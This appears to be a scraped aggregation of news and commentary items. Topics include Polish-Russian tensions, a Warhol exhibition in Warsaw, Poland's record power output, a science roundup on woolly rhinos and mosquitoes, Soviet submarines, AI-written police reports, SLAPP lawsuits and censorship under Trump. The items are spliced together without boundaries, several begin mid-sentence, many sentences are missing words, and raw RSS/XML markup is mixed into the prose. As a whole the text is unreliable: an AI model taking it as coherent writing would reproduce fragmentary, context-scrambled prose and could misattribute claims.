Poland’s foreign ministry published a statement correcting his various falsehoods, including the claim that Poland was itself responsible for Nazi Germany’s decision to invade it.Last year, the Auschwitz Museum, a Polish state institution, also debunked material published by Russia claiming that Poles were among the perpetrators of atrocities at the Nazi-German camp.Diplomatic tensions between Moscow and Warsaw have recently been particularly high due to Russia’s campaign of sabotage and cyberattacks against targets in Poland.The Kremlin has also condemned Poland’s recent detention of a Russian archaeologist wanted by Ukraine for carrying out illegal excavations on occupied Crimea. Russia this week warned its citizens against travelling to Poland due to “Russophobia” and “persecution”.

Why are ‘belief systems’ so powerful? How do they control religion and politics and all ways of thinking from a scientific worldview to conspiracy theories? What is a ‘belief system’? It is a set of tenets or convictions that support each other, such that the whole system governs individual beliefs. How we believe may be more important than what we believe.

We cannot do what we do without your support.Five prints by Andy Warhol feature in a new exhibition in Poland dedicated to the art of the Rusyns, an ethnic group from a region that today lies around the borders between Poland, Slovakia, Ukraine, Hungary and Romania. Warhol’s parents were Rusyns who emigrated to the United States.The exhibition, hosted by the State Museum of Ethnography in Warsaw, describes itself as the first-ever comprehensive presentation of the artistic achievements of the Rusyns, thereby “breaking through decades of silence and exposing the exclusions present in the history of institutional art”.Warhol was born as Andrew Warhola Jr. to Rusyn parents, Ondrej and Julia, from what was then the village of Mikó in Austria-Hungary and is now Miková in Slovakia.When asked about his origins, Warhol famously said, “I am from nowhere”. The creators of the exhibition say that, given the shifting borders of the region and the wide geographical spread of the Rusyn, his words “take on a new meaning: they speak of an identity that can endure across borders and changing places”.Works by Warhol, a leading figure in the 20th-century pop art movement, featured in the exhibition include a set of silkscreen prints of Marilyn Monroe, images from his  series, the Native American-inspired , and a poster for the film .The large-format prints are exhibited alongside mementoes and photographs of the Warhol family, with a particular emphasis on the artist’s relationship with his mother.“We didn’t want to show him in the context of capitalism, pop-art and America, but ethnic identity and origin,” the exhibition’s curator, Michał Szymko, a member of Poland’s Lemko minority, who are considered a subgroup of the Rusyns, told the Polish Press Agency (PAP).“For reasons of poverty, Julia collected tins from drinks and soup to make them into small sculptures and, with her sons, sell them in Pittsburgh’s richer neighbourhoods,” said Szymko. “That was probably what later inspired Warhol to create his famous works depicting Campbell’s soup cans.”“Julia, as a religious woman, took the young Andy to the Orthodox church and told him about the lives of saints. He soaked up her stories and later switched the stories of saints to American stars. In this context, the exhibition juxtaposes Warhol’s image of modernity, Marilyn Monroe, with a 14th-century icon, a symbol of the past.”In 1947, Poland’s new communist authorities forcibly resettled many Rusyns, as well as ethnic Ukrainians, from their traditional homelands to western Poland as part of an action known as Operation Vistula.“Our art was deprived of a guarantee of security as a result of those events, which disrupted transmission of identity. And yet this community still exists, creates art and has its own voice, as this exhibition shows,” the curator noted.“By restoring a voice to those who have been denied it for decades, [the exhibition] demonstrates that the Lemko/Carpatho-Rusyn heritage is not only returning but also persisting – despite attempts to invalidate and assimilate it – as a living element of contemporary culture,” writes the museum.Other famous artists featured in the exhibition, which runs from 17 January to 30 June, include Nikifor, a renowned Lemko naïve painter, and Jerzy Nowosielski.Other works by Warhol can also be seen until 28 February in the exhibition Andy Warhol.

These are the studies this week that entered the belly of the beast, craved human blood, exposed primate bonds, and pranked birds First, a prehistoric chew toy for a puppy opens a window into a doomed lineage. Then: why saving species could save your own skin, the dazzling diversity of same-sex behavior in primates, and the exploits of asexual yams.I’m so hungry, I could eat a woolly rhinocerosRecord scratch, freeze frame: Yep, that's me, an Ice Age woolly rhinoceros in a mummified wolf stomach. You’re probably wondering how I got into this situation. Well, the good news is that it was  because I am inbred, according to a new study.  That’s my pitch for a movie based on the true story of some half-digested woolly rhinoceros () remains that were wolfed down by a permafrost-preserved pupsicle from 14,400 years ago.  Incredibly, scientists were able to sequence the genome of the rhino, which revealed that this individual still had a high level of genetic diversity in its lineage, and no signs of inbreeding. Considering that woolly rhinos vanished from the fossil record around 14,000 years ago, this study suggests that they may have experienced a very sudden population collapse, rather than a gradual demise. “While Late Pleistocene remains of woolly rhinoceros are numerous, very few remains exist from around the estimated time of extinction,” said researchers led by Sólveig M. Guðjónsdóttir of Stockholm University. At 14,400 years old, the mummified tissue found in the wolf is “one of the youngest known woolly rhinoceros remains.”“Given our results, we suggest that any change at the genomic level associated with the species extinction must have taken place during the last few hundred years of the species' existence,” the team added. “We conclude that their decline toward extinction likely occurred rapidly after ∼14,400 years ago, most likely driven by rapid changes in environmental conditions.” In other words, the last supper of a wolf that died when giant ice sheets still covered much of the Northern Hemisphere has opened a window into the rich heritage of this rhinoceros—and the sudden downfall that awaited its relatives. And for anyone interested in cryptids, the authors note that the “last appearance dates in the fossil record do not exclude the possibility that the species persisted for longer.” Does this mean that woolly rhinos live on in some untrammeled wilderness to this day? Definitely not, they are dunzo. But it does raise the tantalizing question of when and where the last woolly rhino took its final steps, ending a long and storied line.Here’s one way to get people to care about biodiversity loss: tell them that the mosquitos are out for their blood. In a new study, scientists captured and studied 145 engorged mosquitoes from a deforested area in Brazil, which revealed a growing reliance on human blood. The results suggest that mosquitoes are more likely to seek out human blood in areas experiencing biodiversity loss.“In the present study, human blood meals were detected in nine species” including mosquitoes that “spread dengue, yellow fever, Zika, and chikungunya,” said researchers led by Dálete Cássia Vieira Alves of the Federal Rural University of Rio de Janeiro. “The results revealed a clear tendency for the captured mosquito species to feed predominantly on humans.”“Deforestation reduces local biodiversity, causing mosquitoes, including vectors of pathogenic agents, to disperse and seek alternative food sources…such as humans,” the team said. In other words, a future of biodiversity collapse is going to be , and , and , given that mosquitoes are notoriously the most dangerous animals to humans—killing  people per year—due to their capacity to spread pathogens. It would be great if we could all conserve wildlife for solely altruistic reasons, but a little nightmare fuel is useful in small doses. Same-sex sexual behavior plays many roles in primatesSame-sex sexual behavior (SSB) is common in nature—documented in more than 1,500 animals—especially among socially complex species like primates. Now, scientists have presented a comprehensive review of these sexual bonds in dozens of non-human primates, which revealed that the interactions are context-dependent and may serve a variety of evolutionary functions. “In baboons, for example, females form affiliative networks, through grooming and possibly SSB, to manage group tension, especially during unstable periods such as hierarchical shifts,” said researchers led by Chloë Coxshall of Imperial College London. “Male rhesus macaques use SSB to navigate aggression and shifting dominance by forming coalitions. Those engaging in SSB are more likely to ally and support each other in competition.”While the study focused on non-human primates, the team also speculated about the possible evolutionary links between SSB in humans and non-human primates, but warned that the study “does not address human sexual orientation, identity or lived experience.”  “While acknowledging that cultural biases have historically shaped how SSB is reported in animals, we hope this study encourages further research into its evolutionary and social roles in primates at large,” the team concluded.Don’t be deceived by the asexual yams Even in all of its diverse configurations, sex is simply not everyone’s bag. Lots of species have opted to eschew it entirely in favor of asexually cloning themselves, such as the Asian yam . This yam has evolved a clever technique to disperse its version of “bulbils,” the asexual version of seeds, by dressing them up like berries so that birds will eat them, reports a new study. This helps the plant spread its clones far and wide without the need for sexual reproduction. “We show that the yam —which has lost sexual reproduction—evolved black, glossy bulbils that mimic co-occurring black berries and entice frugivorous birds to ingest and disperse them,” said researchers co-led by Zhi Chen of the Kunming Institute of Botany at the Chinese Academy of Science and Guillaume Chomicki of Durham University.The team found that birds preferred real berries “yet they significantly consumed bulbils too” and “could not visually discriminate bulbils from berries.” In this way, the yams use “mimicry to deceive birds and achieve longer dispersal distance,” the study concludes.It’s amazing how many adaptive strategies boil down to pranking one’s fellow Earthlings. So if you’re a bird, beware the sham yam yums. And if you are looking to name a band, the Asexual Yams is officially out there as an option.Thanks for reading!

By the late 1950s, it was becoming clear to Soviet naval planners that the United States was winning the battle beneath the world’s oceans.

Over the previous decade, American engineers had developed sophisticated silencing technologies that made the latest generation of submarines so stealthy, they could track Soviet subs for hours, and sometimes days, without being detected. For Soviet naval planners, a nightmare scenario was unfolding. If war broke out, American submarines could find and destroy Soviet submarines before they had a chance to strike back.

Simply catching up to American stealth wasn't an option. It wasn't a technology that could easily be copied, it was the result of decades of precision manufacturing, relentless quality control, advances in materials science, and industrial discipline that the Soviet system couldn't support at the time. It would take decades to catch up.

Faced with a widening stealth technology gap, Soviet planners stopped trying to play hide and seek under the oceans, and instead chose raw power. They would bet everything on speed, depth, maneuverability and brute force.

In 1960, the Soviet Union launched their most ambitious submarine programs in history. Project 705 ‘Lira’, later designated as the ‘Alfa Class’ submarine by NATO, was a nuclear-powered attack submarine capable of outrunning torpedoes, executing extreme maneuvers, and diving deeper than anything the world had ever seen. Built with a revolutionary liquid-metal nuclear reactor, advanced automation, and a titanium hull, this machine represented a generational leap in engineering.
It wasn’t just a faster submarine, it was a radical attempt to rewrite the rules of underwater warfare.

When Western intelligence realized what the Soviets were building, it caused immediate panic. A submarine that could outrun torpedoes and dive beyond existing weapons threatened to upend NATO’s entire anti-submarine strategy, forcing the West into a sudden scramble to catch up.

But Project 705, a super submarine meant to restore balance beneath the seas, would prove to be far more than the Soviets ever bargained for.

We cannot do what we do without your support.Poland has set a new record for electricity generation, passing 30 gigawatts (GW) for the first time, even as the country exported 2.3 GW of power. Around three quarters of the output came from fossil fuels, including almost 60% from coal.The milestone came days after demand also hit a record 29.2 GW gross on 9 January, as temperatures in some regions dropped well below -10 degrees Celsius, sharply increasing heating and electricity use. The country also logged record gas consumption this month.Energy minister Miłosz Motyka said the generation record showed the system could meet domestic demand while supporting neighbouring markets and maintaining what he described as a “solid reserve”.State operator Polish Power Grid (PSE) reported that total gross generation on 14 January reached 30.5 GW. After accounting for power used by plants themselves and auxiliary systems, net generation – a key metric – stood at 28.9 GW.Coal-fired plants supplied 59.9% of the output, gas contributed 13.9%, and renewables – including wind, solar and hydropower – made up 21.2%. PSE said net customer demand reached 26.6 GW that day, while electricity exports approached 2.3 GW.The share of renewables was lower than 29.4% recoded last year, mainly due to reduced solar output during a period of low sunlight.PSE told Notes from Poland that, more important than the generation peak, was the fact that the system operated smoothly despite record demand, with no threat of a blackout.“In the past, during severe freezes, we had to import electricity, and now we are becoming an energy exporter. This shows the stability of the system,” said Aleksandra Dziadykiewicz from PSE’s press office.The energy minister echoed this sentiment. “This is proof of how our energy system operates stably and keeps up with growing needs – with a solid reserve,” Motyka wrote on X.The news comes days after the Polish government revealed that the country’s power grid was the target of a major cyberattack at the end of December and came “very close to a blackout”. It says that Russia was most likely behind the incident.

We cannot do what we do without your support.A record 1.91 million people, over 70% of them from abroad, visited the historic salt mine in Wieliczka, one of Poland’s biggest tourist attractions, last year. That figure is up 10% on 2024 and beats the previous record set in 2019.Officials at the mine, a UNESCO World Heritage Site, say that the record shows they have bounced back from the lull in tourism caused by the pandemic as well as the war in neighbouring Ukraine.The salt mine in Wieliczka, a town near Kraków in southern Poland, began operation in the 13th century and produced table salt continuously until industrial production ended in 1996.Reaching a depth of 327 metres across nine levels, the corridors of the mine stretch for some 245 kilometres underground. Tourists have been visiting the mine since the 18th century, and it was named on the original UNESCO World Heritage Site list in 1978.Today, they follow a 2.2 km tourist route covering the mine’s first three levels, including attractions such as the cavernous St Kinga’s chapel, carved out of the rock salt by miners more than 100 metres underground and featuring a bas-relief version of Leonardo’s carved in salt.More than 70% of visitors in 2025 were from outside of Poland, led by those from the UK (272,000), Italy (143,000) and France (87,000), reports the Polish Press Agency (PAP).In April 2025, the mine introduced AI-based chatbots to help manage increasing numbers of tourists. Created by the Kraków-based company ChatLab, the bots, which can answer questions in 20 languages, now deal with 17% of interactions with potential visitors.Barbara Zięba-Godula, the mine’s CEO, told PAP that the new figures are “a historic result that shows that we have rebuilt the tourism whose growth was halted in 2019, first because of the pandemic, and later the war in Ukraine”.Officials at the mine expect that it might welcome even more visitors this year, hoping to break 2 million for the first time. “We are hopeful and fully prepared to welcome such numbers,” Zięba-Godula said.A record 40.8 million tourists – one fifth of them foreigners – stayed in registered accommodation facilities across Poland last year, up 11.8% compared to the pre-pandemic year of 2019, according to Statistics Poland (GUS), a state agency.Last year, the Auschwitz Museum, a very different but equally popular site among visitors to Poland, announced new restrictions on entry amid a surge in numbers.

Dogmatic approaches like those aren’t right, they’re not smart, they’re not helpful, and they will never produce any progress or interesting discussion. They’re a sort of religious beliefs pointed at a terrestrial industry and they make no sense. And now let me add a rhetorical statement of my own, so that there’s no misunderstanding: every game publisher and developer out there is free to make their own decisions regarding AI, full stop. I’m here to talk, not to make demands.Now that that’s out of the way, let’s talk about indie publisher Hooded Horse and its “zero AI” policy that it has written into its developer contracts. CEO Tim Bender spoke with Kotaku recently on the topic and he certainly didn’t hold back.The label he helps run as CEO, Hooded Horse, struck gold after signing the medieval base-builder mega hit Manor Lords, but its library of published games has grown far beyond it in the past two years with releases like the Lego-like tower-defense game Cataclismo, the economic management sim Workers & Resources: Soviet Republic, and the 4X sequel Endless Legend 2. Being strategy games isn’t the only thing they all have in common. They also all adhere to a strict ban on generative AI art.“I fucking hate gen AI art and it has made my life more difficult in many ways…suddenly it infests shit in a way it shouldn’t,” Bender told me in a recent interview. “It is now written into our contracts if we’re publishing the game, ‘no fucking AI assets.’”Now, if Bender says this has made his life more difficult, I’m going to choose to believe him. Honestly, I can’t imagine why he’d lie about something like that. But he’s also clearly answered “yes” to rhetorical question #2 I posted above. And I just don’t understand it as a long term contractual policy. If AI largely sucks right now in the gaming industry, and I agree there’s a lot of bad out there, that doesn’t mean it will in the future. If AI has the capability to take some jobs in the industry today, that doesn’t mean it can’t create jobs elsewhere in the industry as well. If some applications of AI in the gaming industry carry with it very real moral questions, that doesn’t mean that  use does.But when you  dig into Bender’s stated concerns that have led him to a blanket ban on the use of any AI by partner developers, you quickly understand his actual concern is a quality control concern.“We’ve gotten to the point where we also talk to developers and we recommend they don’t use any gen AI anywhere in the process because some of them might otherwise think, ‘Okay, well, maybe what I’ll do is for this place, I’ll put it as a placeholder,’ right?” continued Bender.“Like some, people will have this thought, like they would never want to let it in the game, but they’ll think, ‘It can be a placeholder in this prototype build.’ But if that gets done, of course, there’s a chance that that slips through, because it only takes one of those slipping through in some build and not getting replaced or something. […] Because of that, we’re constantly having to watch and deal with it and try to prevent it from slipping in, because it’s cancerous.” It’s the Larian Studios concept art discussion all over again. Bender doesn’t seem to have an actual problem with developers using AI in developing a game. Instead, it appears he doesn’t want any AI-made product ending up in the finished game. Those are two very different things. But rather than trying to figure out how to QC the developers to make sure the end product is clean of AI, since that seems to be what Bender is after, we get a blanket ban on all AI use everywhere, all the time, by the developers.Now, to keep things clear, my position is that Bender certainly  do this if he likes. It’s his company, have at it. But when I read this…“When it comes to gen-AI, it’s not a PR issue, it’s an ethics issue,” Bender said. “The reality is, there’s so much of it going on that the commitment just has to be that you won’t allow it in the game, and if it’s ever discovered, because this artist that was hired by this outside person slipped something in, you get it out and you replace it. That has to be the commitment. It’s a shame that it’s even necessary and it’s a very frustrating thing to have to worry about.”…I’m left with the impression that I’m listening to someone devoid of nuance reciting a creed rather than fully thinking this through.AI  be used in gaming. To borrow a phrase, it’s a very frustrating thing to have to even state. It’s tough to get more obvious than that. The question and the conversation, as I keep saying, is about it will be used, not  it will be used.And people like Bender have exited that conversation, which is too bad. He’s clearly a good businessman and smart industry guy. We need his voice in the discussion.]]></content:encoded></item><item><title>Kaizen!

But so many people seem to feel it’s nothing more than an unpaid intern you can lean on to do all the work you don’t feel like doing yourself. (And the less said about its misuse to generate a webful of slop, the better.)Like everyone everywhere, police departments are starting to rely on AI to do some of the menial work cops don’t like doing themselves. And it’s definitely going poorly. More than a year ago, it was already apparent that law enforcement agencies were just pressing the “easy” button, rather than utilizing it wisely to work smarter and faster. Axon — the manufacturer of Taser and a line of now-ubiquitous body cameras — has pushed hard for AI adoption. Even it knows AI use can swiftly become problematic if it’s not properly backstopped by humans. But the humans it sells its products too don’t seem to care for anything other than its ability to churn out paperwork with as little human involvement as possible. The report notes that Draft One includes a feature that can intentionally insert silly sentences into AI-produced drafts as a test to ensure officers are thoroughly reviewing and revising the drafts. However, Axon’s CEO mentioned in a video about Draft One that most agencies are choosing not to enable this feature.Yep. They just don’t care. If it means cases get tossed because sworn statements have been AI auto-penned, so be it. If someone ends up falsely accused of a crime or falsely arrested because of something AI whipped up, that’s just the way it goes. And if it adds a layer of plausible deniability between an officer and their illegal actions, even better. Not only is the tech apparently not saving anyone much time, it’s also being abused by law enforcement officers to justify their actions after the fact. But it’s shiny and new and seems sleek and futuristic, so of course reporters will occasionally decide to do law enforcement’s PR work for it by presenting incredibly fallible tech as the 8th wonder of the police world. Sometimes reporters bury the lede. And sometimes their editors decide the lede should be buried by the end of the headline. That appears to be the case here, where Mya Constantino’s reporting isn’t exactly what’s being touted in this article’s original headline. As can be observed from viewing the URL, the current headline (updated January 1st) wasn’t the  headline. The Wayback Machine tells the real story. This article was originally published on December 19, 2025 with  headline: That headline (which reads “How Utah police departments are using AI to keep streets safer”) was immediately followed by these paragraphs:Here’s a direct quote of those leading paragraphs: HEBER CITY, Utah — An artificial intelligence that writes police reports had some explaining to do earlier this month after it claimed a Heber City officer had shape-shifted into a frog.However, the truth behind that so-called magical transformation is simple.“The body cam software and the AI report writing software picked up on the movie that was playing in the background, which happened to be ‘The Princess and the Frog,'” Sgt. Keel told FOX 13 News. “That’s when we learned the importance of correcting these AI-generated reports.”Fortunately, those paragraphs still remain in the updated post, which now contains a headline that makes a lot more sense: The headline (accompanied by a short video of a tree frog) says: Ribbit ribbit! Artificial Intelligence programs used by Heber City police claim officer turned into a frogWhile I can understand why a small news outlet (albeit one that’s a Fox affiliate) might decide to play nice with the local cops rather than call out their software failure in the headline, it really doesn’t make it . My guess is the original headline was about maintaining access to officers and officials. At some point, someone realized the stuff detailed in the first paragraphs would probably attract more attention than some dry recitation of cop AI talking points. But even the belated headline change doesn’t really make anything better here. There’s not really anything in the article that demonstrates  AI is making anyone  The article also notes that two different AI programs are currently being tested (Code Four, developed by a couple of 19-year-old former MIT students) and Draft One, which is part of Axon’s vertical integration strategy. That was the product that turned a cop into a frog, which probably explains why the reporter’s ridealong (so to speak…) only involved use of Code Four’s AI. The reporter was on hand for a faux traffic stop that was later summarized by the AI to (apparently) demonstrate its usefulness. The journalist points out that the AI-generated report needed corrections, but at least didn’t turn any of the participants into a Disney-inspired character.That being said, there’s nothing here that indicates these products will make streets “safer.” Here is the entirety of what was said about the tech’s positives by Sgt. Rick Keel of the Heber City PD:Keel says one of the major draws is that the software saves them time, as writing reports typically takes 1-2 hours.“I’m saving myself about 6-8 hours weekly now,” Keel said. “I’m not the most tech-savvy person, so it’s very user-friendly.”Giving cops more free time doesn’t make streets safer. It just means they have more time on their hands. That’s not always a good thing. Of all the things that need to be fixed in terms of US policing, writing reports is pretty far down the list. It’s what’s being done with this extra time that actually matters. Pursuing efficiency for its own sake makes no sense in the context of law enforcement. The statements by this PD official raise questions that were never asked by the reporter, like the most important one: what is being done with this saved time? And if something still requires a lot of human activity to keep it from generating nonsense, is it really any better than the system it’s replacing? One thing is for sure: AI doing the menial work of filing police reports is never going to make anyone safer. On the contrary, it’s only going to increase the chance that someone’s rights will be violated. And because law enforcement agencies refuse to be honest about the risks this poses and the fact that it appears only officers who don’t like writing paperwork will benefit from this added expense, they shouldn’t be trusted with tech that will ultimately only make the bad parts of US policing even worse.]]></content:encoded></item><item><title>EFF Condemns FBI Search of Washington Post Reporter’s Home</title><link>https://www.eff.org/deeplinks/2026/01/eff-condemns-fbi-search-washington-post-reporters-home</link><author>Joe Mullin</author><category>tech</category><enclosure url="https://www.eff.org/files/banner_library/press_freedom_img_v3.png" length="" type=""/><pubDate>Fri, 16 Jan 2026 23:19:20 +0000</pubDate><source url="https://www.eff.org/rss/updates.xml">Deeplinks</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Rackspace customers grapple with “devastating” email hosting price hike</title><link>https://arstechnica.com/information-technology/2026/01/rackspace-raises-email-hosting-prices-by-as-much-as-706-percent/</link><author>Scharon Harding</author><category>tech</category><enclosure url="https://cdn.arstechnica.net/wp-content/uploads/2026/01/GettyImages-2206289956-1024x648.jpg" length="" type=""/><pubDate>Fri, 16 Jan 2026 23:15:27 +0000</pubDate><source url="https://arstechnica.com/">Biz &amp; IT - Ars Technica</source><content:encoded><![CDATA[Rackspace’s new pricing for its email hosting services is “devastating,” according to a partner that has been using Rackspace as its email provider since 1999.In recent weeks, Rackspace updated its email hosting pricing.

Filed in a court of common pleas in Allegheny County, Pennsylvania, and since removed to federal court by the defendants, the suit has gone under the radar by most news outlets.I wrote for  about the lawsuit but little coverage has picked it up. I hope that changes in the coming months as litigation advances in the case.The lawsuit alleges a civil conspiracy bankrolled by Aylo to defame Rhodes and NoFap. Rhodes is a divisive figure in the wider anti-porn discussion as he believes that breaking “pornography addiction,” (which is not an accepted diagnosis in the DSM-5) requires participants to not engage in masturbation or watching pornography in a bid to “reboot” their brains. The theory is not supported by most science.Nonetheless, he and his movement have gained traction over the years. Some sexual health experts started to scrutinize the claims of the NoFap philosophy as well as its supposed scientific basis. Because there has been some research pushing back on some of NoFap’s claims, lawyers for Rhodes claims it is proof of organized and explicit coordination to defame him. According to the lawsuit, Aylo is supposedly at the center of this scheme and allegedly paid off two scientists who have published critical research on NoFap. Furthermore, the complaint argues that UCLA and the academic publisher Taylor & Francis engaged in this defamation scheme by “aiding and abetting” the pair of scientists and Aylo by publishing the research.This is a very weird lawsuit.But what makes it weirder and more alarming than it is stems from the narrative pushed by the plaintiffs. In a bid to demonstrate the conspiracy, Rhodes presents a theory that the scientists and Aylo actively engaged in  to dozens of journalists and other media personalities, including myself, to advance messages that disparage the NoFap company and its founder. Companies doing media pitches happen every day. Media pitches do not make anything into a conspiracy.According to this theory, Rhodes alleges a coordinated media narrative that advances Aylo’s interests with the supposed end goal of… silencing this random dude who makes money off of telling people not to watch porn and jerk off. Even though Rhodes has the right to believe and communicate what he believes, it is quite a reach to insist that research and criticism of his beliefs and movement, including bog standard press coverage, amount to a conspiracy to defame.Having people review strong claims is part of how academic research works. Having the media cover that research happens every day. It is silly to conclude that this turns it into a conspiracy.And this week, Rhodes ramped things up a notch by claiming not just your garden variety conspiracy, but a RICO claim. Rather than go into the details of that, we’ll just point you to an archive of Ken White’s lawsplainer: IT’S NOT RICO, DAMMIT.Other journalists, like Gustavo Turner, have written on some of the more outlandish claims of so-called porn induced erectile dysfunction (PIED). PIED is not an official diagnosis, and is more likely to be related to underlying issues as pornography is wholly unlikely to contribute to erectile dysfunction among men. Turner was called a “collaborator” against Rhodes in the suit, even though Turner has never directly written about him, and defamation has to be of and about someone specifically. The article linked above, which is also mentioned in the lawsuit does not discuss Rhodes and only mentions “NoFap” in the context of a hashtag “phenomena,” not having anything to do with Rhodes’ organization specifically.Others mentioned in the lawsuit include authors with bylines at other outlets like , , , and many others. He mentions “disparaging” media communicated by LGBTQ+ figures like Dan Savage of the Savage Love podcast because Savage hosted one of the defendants on his podcast talking about her research.The lawsuit is quite expansive.While I am not a defendant in the case, I still feel that listing out the simple mentioning of Rhodes’ critics as part of the grand conspiracy is a form of intimidation. It’s not as direct, but Rhodes appears to be trying to put on notice those who scrutinize the claims he makes that they could be the next defendant added. This chills speech and reporting on more than just Rhodes and NoFap. It speaks to wider sentiments in today’s culture about how the courts can be a weapon to censor journalists from doing their jobs.Already I have heard from journalists who claim that publications are rejecting pitches about Rhodes and NoFap, with the implication being that the publications are worried about litigation threats for merely writing about him. It feels like a classic case of chilling effects via a SLAPP suit, and it’s why anti-SLAPP laws are so important.What is ironic is that Rhodes accuses the defendants in this case of intimidation: buying off journalists and the very outlets they allege advances the talking points of an organized civil conspiracy against his business and personage. Journalists aren’t a part of the conspiracy. They’re just reporting on what’s happening, and sometimes that includes research results. And, yes, sometimes that includes criticism of companies like Aylo for bad things they’ve done as well. Because journalists are reporting the news, not engaged in a grand conspiracy.A thoughtful, reasonable, reflective person might take the time to personally reflect on why so many articles question the narrative he’s pushing. Others, however, might just claim a conspiracy against them.Michael McGrady covers the tech and legal sides of the online porn business.]]></content:encoded></item><item><title>Watch: Trump&apos;s Full Speech at World Economic Forum in Davos | WSJ</title><link>https://www.youtube.com/watch?v=MSEycl66RFk</link><author>The Wall Street Journal</author><category>yt</category><enclosure url="https://www.youtube.com/v/MSEycl66RFk?version=3" length="" type=""/><pubDate>Fri, 16 Jan 2026 21:26:58 +0000</pubDate><source url="https://www.youtube.com/channel/UCK7tptUDHh-RYDsdxO1-5QQ">The Wall Street Journal</source><content:encoded><![CDATA[President Trump delivers an address during the 2026 World Economic Forum in Davos, Switzerland.

Blackman didn’t like that. So, he sued Poulson—along with Substack, Amazon Web Services, and Poulson’s non-profit, Tech Inquiry—to try and force Poulson to take his articles down from the internet.Fortunately, the trial court saw this case for what it was: a classic SLAPP, or a strategic lawsuit against public participation. The court dismissed the entire complaint under California’s anti-SLAPP statute, which provides a way for defendants to swiftly defeat baseless claims designed to chill their free speech.The appeals court should affirm the trial court’s correct decision.  Poulson’s reporting is just the kind of activity that the state’s anti-SLAPP law was designed to protect: truthful speech about a matter of public interest. The felony domestic violence arrest of the CEO of a controversial surveillance company with U.S. military contracts is undoubtedly a matter of public interest. As we explained to the court, “the public has a clear interest in knowing about the people their government is doing business with.”Blackman’s claims are totally meritless, because they are barred by the First Amendment. The First Amendment protects Poulson’s right to publish and report on the incident report. ]]></content:encoded></item><item><title>OpenAI to test ads in ChatGPT as it burns through billions</title><link>https://arstechnica.com/information-technology/2026/01/openai-to-test-ads-in-chatgpt-as-it-burns-through-billions/</link><author>Benj Edwards</author><category>tech</category><enclosure url="https://cdn.arstechnica.net/wp-content/uploads/2024/02/openai_glowing_green-1152x648.jpg" length="" type=""/><pubDate>Fri, 16 Jan 2026 21:20:03 +0000</pubDate><source url="https://arstechnica.com/">Biz &amp; IT - Ars Technica</source><content:encoded><![CDATA[On Friday, OpenAI announced it will begin testing advertisements inside the ChatGPT app for some US users in a bid to expand its customer base and diversify revenue.

He just plays one on TV while doing the exact opposite behind the scenes. And in front of the scenes. And basically everywhere. Over and over and over again.Nora Benavidez at Free Press (not the Bari Weiss publication, but the civil society group that has been around for years) has done the tedious but essential work of actually counting the censorship attempts from the Trump administration over the administration’s first year. Writing in the New York Times, she puts the number at around 200 documented instances:Since returning to office, Mr. Trump and his administration have tried to undermine the First Amendment, suppress information that he and his supporters don’t like and hamstring parts of the academic, legal and private sectors through lawsuits and coercion — to flood the zone, as his ally Steve Bannon might say.Two hundred. In a single year. From the guy who never shuts up about how he’s the greatest defender of free speech in American history.As we pointed out a few months back, Trump didn’t just stumble into hypocrisy—he (as he does so often these days) literally said the quiet part out loud when explaining his executive order attempting to criminalize flag burning:“We took the freedom of speech away.”That’s… that’s not the flex you think it is, my dude.The examples Benavidez catalogs range from the high-profile to the quietly terrifying. Many you’ve probably heard about:His administration banned Associated Press reporters from certain parts of the White House and Air Force One because the outlet uses “Gulf of Mexico” rather than the term Mr. Trump prefers, “Gulf of America.” It tried and failed to force some of the nation’s biggest news organizations to agree to restrictions on coverage of the Pentagon. He has said critical coverage of his initiatives is “really illegal.”In March, Mahmoud Khalil, a green card holder and a leader of pro-Palestinian demonstrations on the Columbia campus, was arrested and detained by immigration officials for several months. That month, Rumeysa Ozturk, a student visa holder, was arrested by immigration officials and detained for several weeks, apparently because she was an author of an opinion essay criticizing Tufts University for its response to the Israel-Hamas war.Arresting people and threatening deportation because of their political speech. That’s not a misunderstanding of the First Amendment—it’s a direct assault on it.And the targets keep expanding.After Federal District Court Judge James Boasberg ruled against the administration in a case involving the deportation of Venezuelans to El Salvador, Mr. Trump called for the judgefrom the F.B.I.’s academy, apparently for having displayed an L.G.B.T.Q. Pride flag. The F.B.I. also appears to haveagents for kneeling during George Floyd protests.The administration has gone after law firms, forcing settlements where they agree to do pro bono work for administration-approved causes. Universities have been coerced into changing policies and paying millions. Social media platforms—the same ones MAGA world spent years screaming about for “censorship”—have been sued over their content moderation decisions and forced into “settlements” to stay in the good graces of our thin-skinned dictator wannabe:Mr. Trump has sued social media platforms for their content moderation policies — free-speech decisions, in other words — leading to Meta, X and YouTube capitulating through settlements totaling around $60 million.Let’s be clear about what that means: the President of the United States sued private companies because he didn’t like how they exercised their own First Amendment rights regarding what speech to host on their own platforms. And got them to pay up, because the alternative of being a constant target, was worse.That’s the opposite of free speech.Remember all those years of Republicans insisting that when private platforms made moderation decisions they didn’t like, it was “censorship,” but when the government did it, that was just fine? Yeah. We’re living in that world now.Benavidez makes an important point about how this all works together:What is important to recognize is that these efforts work in concert in their frequency and their volume: Even the most egregious cases seem to quickly fade from public consciousness, and in that way, they’re clearly meant to overwhelm us and make us think twice about exercising our rights.This is the Bannon “flood the zone” strategy applied to constitutional rights. You can’t focus on any single outrage because there are fifteen new ones by the time you finish reading about it. Each individual act of censorship might spark a news cycle, but two hundred of them? That’s just… Tuesday.And here’s what’s maddening: this is the same guy whose supporters spent years screaming that the Biden administration was engaged in unprecedented censorship because some officials sent some angry emails to social media companies—emails that, as we’ve covered extensively, the companies routinely ignored. That was the constitutional crisis that required Elon Musk to buy Twitter and “free the bird.”But actual government coercion? Actual arrests? Actual lawsuits forcing private companies to change their speech policies? Actual bans on journalists? That’s apparently just “making America great again.”Benavidez closes with a warning that shouldn’t need stating but apparently does:But constitutional rights and democratic norms don’t disappear all at once; they erode slowly. The next three years will require a vigilant defense of free speech and open debate.She’s right. And part of that vigilance means not letting the “free speech” crowd get away with pretending that the guy actively engaged in government censorship at scale is somehow its greatest defender.Two hundred times. In one year. And we’re just getting started on year two.]]></content:encoded></item><item><title>Stellan Skarsgård’s Closet Picks</title><link>https://www.youtube.com/watch?v=vpw582iA-n4</link><author>CRITERION</author><category>movies</category><enclosure url="https://www.youtube.com/v/vpw582iA-n4?version=3" length="" type=""/><pubDate>Fri, 16 Jan 2026 19:53:29 +0000</pubDate><source url="https://www.youtube.com/feeds/videos.xml?playlist_id=PL7D89754A5DAD1E8E">Movies - Criterion</source><content:encoded><![CDATA[The actor talks about showing SEVEN SAMURAI to all of his children, celebrates Katrin Cartlidge’s performance in NAKED, and shares why CITY 